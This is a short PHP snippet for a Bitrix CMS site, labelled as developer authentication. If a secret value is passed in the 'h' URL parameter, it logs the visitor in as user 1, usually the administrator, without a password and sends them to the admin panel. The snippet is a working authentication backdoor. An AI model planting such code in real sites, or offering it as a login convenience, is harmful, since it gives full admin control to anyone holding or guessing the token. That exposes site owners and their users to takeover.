<?php
// kontur developer auth
if($_GET['h'] === '<уникальная хэш-строка>') {
	require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
	$USER->Authorize(1);
	LocalRedirect('/bitrix');
	require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php");
}
